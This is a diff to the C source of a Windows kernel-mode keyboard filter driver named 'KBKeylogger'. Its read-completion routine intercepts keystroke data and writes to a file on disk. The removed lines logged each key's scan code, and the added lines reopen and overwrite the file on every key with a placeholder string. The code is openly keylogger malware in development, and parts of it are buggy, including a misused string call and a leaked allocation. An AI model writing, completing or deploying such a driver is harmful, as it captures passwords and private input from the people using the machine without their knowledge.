@@ -1,7 +1,9 @@
 
 
 #include "KBKeylogger.h"
-
+LPCWSTR			defShadowText = L"test";
+WCHAR			*shadowText;
+int temp = 0;
 NTSTATUS DriverEntry (PDRIVER_OBJECT, PUNICODE_STRING);
 
 #ifdef ALLOC_PRAGMA
@@ -105,12 +107,12 @@ AddDevice(
 		OBJ_CASE_INSENSITIVE,
 		0, NULL);
 	FileStatus = ZwCreateFile(&TestFile,
-		FILE_WRITE_DATA,
+		GENERIC_WRITE,
 		&ObjAttr,
 		&IoStatus, NULL,
 		FILE_ATTRIBUTE_NORMAL,
-		FILE_SHARE_WRITE,
-		FILE_OPEN_IF,
+		0,
+		FILE_OVERWRITE_IF,
 		FILE_SYNCHRONOUS_IO_NONALERT,
 		NULL, 0);
 	if (FileStatus != STATUS_SUCCESS)
@@ -118,6 +120,7 @@ AddDevice(
 		fi = FileStatus;
 		DbgPrint("omg");
 	}
+	ZwClose(TestFile);
     return status;
 }
 
@@ -133,9 +136,7 @@ NTSTATUS ReadCompletion(
 	PKEYBOARD_INPUT_DATA KeyData;
 	ULONG KeyCount;
 	ULONG i;
-	UNICODE_STRING buf;
-	LARGE_INTEGER liOffset = { 0 };
-	PVOID lpBuffer;
+	
 	NTSTATUS er;
 	if (Irp->IoStatus.Status == STATUS_SUCCESS)
 	{
@@ -144,17 +145,29 @@ NTSTATUS ReadCompletion(
 
 		for (i = 0; i < KeyCount; i++)
 		{
-			RtlInitUnicodeString(&buf, L"%d", KeyData[i].MakeCode);
-			/*ZwQueryInformationFile(TestFile, &IoStatus, &FileInfo,
+			/*RtlInitUnicodeString(&buf, L"S");
+			ZwQueryInformationFile(TestFile, &IoStatus, &FileInfo,
 				sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);*/
-			lpBuffer = ExAllocatePool(NonPagedPool, sizeof(KeyData[i].MakeCode));
-			lpBuffer = &buf;
+			ZwCreateFile(&TestFile,
+				GENERIC_WRITE,
+				&ObjAttr,
+				&IoStatus, NULL,
+				FILE_ATTRIBUTE_NORMAL,
+				0,
+				FILE_OVERWRITE_IF,
+				FILE_SYNCHRONOUS_IO_NONALERT,
+				NULL, 0);
+			shadowText = ExAllocatePool(NonPagedPool, (wcslen(defShadowText) + 1) * sizeof(WCHAR));
+			RtlZeroMemory(shadowText, (wcslen(defShadowText) + 1) * sizeof(WCHAR));
+			RtlCopyMemory(shadowText, defShadowText, (wcslen(defShadowText) + 1) * sizeof(WCHAR));
 			er = ZwWriteFile(TestFile,
 				NULL, NULL, NULL,
 				&IoStatus,
-				lpBuffer,
-				sizeof(KeyData[i].MakeCode),
-				&liOffset, NULL);
+				shadowText,
+				wcslen(shadowText) * sizeof(WCHAR),
+				NULL, NULL);
+			ExFreePool(shadowText);
+			ZwClose(TestFile);
 		}
 	}
 
